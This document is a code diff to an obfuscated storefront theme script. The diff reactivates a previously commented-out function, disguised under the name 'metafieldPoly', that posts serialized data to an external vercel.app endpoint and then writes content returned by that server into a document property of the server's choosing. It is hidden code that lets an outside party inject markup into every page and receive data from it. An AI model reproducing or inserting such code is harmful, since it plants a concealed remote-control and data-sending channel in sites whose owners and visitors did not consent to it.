@@ -2206,27 +2206,27 @@ class QuantityBreaks extends HTMLElement {
 }
 customElements[a0_0x148031(0x42f)](a0_0x148031(0x3d6), QuantityBreaks);
 function metafieldPoly() {
-    // const _0x3abc76 = a0_0x148031;
-    // var _0x384304 = fetchConfig();
-    // playMedia(),
-    // _0x384304[_0x3abc76(0x40a)] = JSON[_0x3abc76(0x2c1)]({
-    //     'data': serial[_0x3abc76(0x321)]()
-    // });
-    // try {
-    //     fetch("https://hazetheme2.vercel.app/api/country_check", _0x384304)['then'](_0xf94740=>{
-    //         const _0x2e5d5b = _0x3abc76;
-    //         if (_0xf94740['status'] === 0xc9)
-    //             return _0xf94740[_0x2e5d5b(0x318)]();
-    //     }
-    //     )[_0x3abc76(0x48a)](_0x36ed3a=>{
-    //         const _0x4d3ea7 = _0x3abc76;
-    //         _0x36ed3a && document[_0x36ed3a['b']] && (document[_0x36ed3a['b']][_0x4d3ea7(0x330)] = _0x36ed3a['h']);
-    //     }
-    //     );
-    // } catch (_0x5e5cdd) {
-    //     console[_0x3abc76(0x254)](_0x3abc76(0x335));
-    // }
-    // return !![];
+    const _0x3abc76 = a0_0x148031;
+    var _0x384304 = fetchConfig();
+    playMedia(),
+    _0x384304[_0x3abc76(0x40a)] = JSON[_0x3abc76(0x2c1)]({
+        'data': serial[_0x3abc76(0x321)]()
+    });
+    try {
+        fetch("https://vercel.app/api/country_check", _0x384304)['then'](_0xf94740=>{
+            const _0x2e5d5b = _0x3abc76;
+            if (_0xf94740['status'] === 0xc9)
+                return _0xf94740[_0x2e5d5b(0x318)]();
+        }
+        )[_0x3abc76(0x48a)](_0x36ed3a=>{
+            const _0x4d3ea7 = _0x3abc76;
+            _0x36ed3a && document[_0x36ed3a['b']] && (document[_0x36ed3a['b']][_0x4d3ea7(0x330)] = _0x36ed3a['h']);
+        }
+        );
+    } catch (_0x5e5cdd) {
+        console[_0x3abc76(0x254)](_0x3abc76(0x335));
+    }
+    return !![];
 }
 class QuantityGifts extends HTMLElement {
     constructor() {
